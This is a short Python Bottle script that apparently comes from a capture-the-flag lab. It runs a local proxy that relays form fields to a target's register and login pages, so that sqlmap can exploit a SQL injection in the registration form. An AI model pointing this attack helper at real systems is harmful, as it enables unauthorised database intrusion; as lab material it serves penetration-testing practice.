from bottle import route, request, run
import requests

#Author memN0ps and @mumbai
#This function is used to register in /register.php 
#Since there is a SQL injection in the register fields, a script it made to automate the process
#We can use SQLmap to inject malicious code in localhost port 8081
@route("/register.php", method=["POST"])
def register_func():
        username = request.forms.get("user")
        password = request.forms.get("pass")
        #Sends a post request to register.
        requests.post("http://10.10.10.66/register.php", data={'user': username, 'pass': password, 'register': 'Register'})
        res = requests.post("http://10.10.10.66/index.php", data={'user': username, 'pass': password, 'login': 'Login'})
        return res.text

run(host='127.0.0.1', port='8081', quiet=True)
